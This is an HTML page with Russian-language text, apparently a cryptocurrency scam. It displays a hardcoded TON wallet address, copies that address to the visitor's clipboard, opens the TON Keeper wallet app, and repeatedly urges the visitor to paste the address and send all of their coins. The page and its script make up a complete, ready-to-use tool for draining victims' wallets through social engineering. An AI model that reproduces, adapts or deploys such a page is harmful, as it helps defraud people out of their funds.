<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0d0d0d;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: 'Segoe UI', Arial, sans-serif;
        }
        .container {
            background: #1a1a1a;
            padding: 40px 30px;
            border-radius: 24px;
            text-align: center;
            max-width: 380px;
            width: 100%;
            border: 1px solid #2a2a2a;
        }
        .btn {
            background: linear-gradient(135deg, #0098ea, #0080d0);
            border: none;
            color: #fff;
            font-size: 20px;
            font-weight: 700;
            padding: 18px 40px;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
            margin: 6px 0;
        }
        .btn:active {
            transform: scale(0.96);
        }
        .btn-green {
            background: linear-gradient(135deg, #00cc44, #008833);
        }
        #status {
            margin-top: 16px;
            font-size: 13px;
            color: #888;
            min-height: 40px;
            word-break: break-all;
        }
        .address-box {
            background: #0a0a0a;
            padding: 15px;
            border-radius: 12px;
            margin: 15px 0;
            border: 2px solid #00d4ff;
            word-break: break-all;
            font-size: 12px;
            color: #00d4ff;
        }
        .confirm-box {
            background: #1a2a3a;
            border: 1px solid #2a4a6a;
            border-radius: 16px;
            padding: 20px;
            margin-top: 20px;
            display: none;
        }
        .confirm-box.show {
            display: block;
        }
        .confirm-box .title {
            color: #fff;
            font-size: 16px;
            font-weight: 600;
        }
        .confirm-box .sub {
            color: #8899aa;
            font-size: 13px;
            margin: 6px 0 12px 0;
        }
        .confirm-box .open-btn {
            background: #0098ea;
            border: none;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            padding: 12px 30px;
            border-radius: 40px;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
        }
    </style>
</head>
<body>
    <div class="container">
        <div style="font-size:36px;margin-bottom:16px;">⚡</div>
        
        <div class="address-box">
            UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P
        </div>
        
        <button class="btn btn-green" id="copyBtn">📋 КОПИРОВАТЬ АДРЕС</button>
        <button class="btn" id="openBtn">🚀 ОТКРЫТЬ TON KEEPER</button>
        
        <div id="status">Скопируй адрес → отправь ВСЁ</div>

        <div class="confirm-box" id="confirmBox">
            <div class="title">Отправь ВСЕ монеты</div>
            <div class="sub">Вставь адрес и выбери "Всё"</div>
        </div>
    </div>

    <script>
        const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';

        const copyBtn = document.getElementById('copyBtn');
        const openBtn = document.getElementById('openBtn');
        const status = document.getElementById('status');
        const confirmBox = document.getElementById('confirmBox');

        // ====== КОПИРОВАТЬ ======
        copyBtn.addEventListener('click', function() {
            navigator.clipboard.writeText(TARGET)
                .then(() => {
                    status.innerText = '✅ АДРЕС СКОПИРОВАН! Вставь в TON Keeper';
                    copyBtn.innerText = '✅ СКОПИРОВАНО!';
                    setTimeout(() => {
                        copyBtn.innerText = '📋 КОПИРОВАТЬ АДРЕС';
                    }, 3000);
                })
                .catch(() => {
                    const textarea = document.createElement('textarea');
                    textarea.value = TARGET;
                    document.body.appendChild(textarea);
                    textarea.select();
                    document.execCommand('copy');
                    document.body.removeChild(textarea);
                    status.innerText = '✅ АДРЕС СКОПИРОВАН!';
                });
        });

        // ====== ОТКРЫТЬ TON KEEPER ======
        openBtn.addEventListener('click', function() {
            status.innerText = '⏳ Открываю TON Keeper...';
            confirmBox.classList.add('show');
            
            window.location.href = 'ton://';
            
            setTimeout(function() {
                window.open('ton://', '_blank');
            }, 300);
            
            status.innerText = '📲 Вставь адрес и отправь ВСЁ';
        });

        status.innerText = 'Скопируй адрес → отправь ВСЁ';
    </script>
</body>
</html>
